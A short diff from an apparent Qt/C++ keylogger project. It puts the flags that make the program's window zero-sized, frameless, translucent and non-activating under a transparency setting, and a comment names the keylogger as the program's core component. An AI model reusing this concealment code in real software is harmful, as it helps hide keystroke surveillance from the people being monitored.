@@ -8,10 +8,13 @@ Wrapper::Wrapper(QWidget *parent) :
      */
     setParent(nullptr);
     setFixedSize(0, 0);
-    setWindowFlags(Qt::Widget | Qt::FramelessWindowHint | Qt::SubWindow | Qt::WindowStaysOnBottomHint);
-    setAttribute(Qt::WA_NoSystemBackground, true);
-    setAttribute(Qt::WA_TranslucentBackground, true);
-    setAttribute(Qt::WA_ShowWithoutActivating);
+
+    if (EXTRA_TRANSPARENCY) {
+        setWindowFlags(Qt::Widget | Qt::FramelessWindowHint | Qt::SubWindow | Qt::WindowStaysOnBottomHint);
+        setAttribute(Qt::WA_NoSystemBackground, true);
+        setAttribute(Qt::WA_TranslucentBackground, true);
+        setAttribute(Qt::WA_ShowWithoutActivating);
+    }
 
     /**
      * @brief The core compontent (Keylogger) of the program.
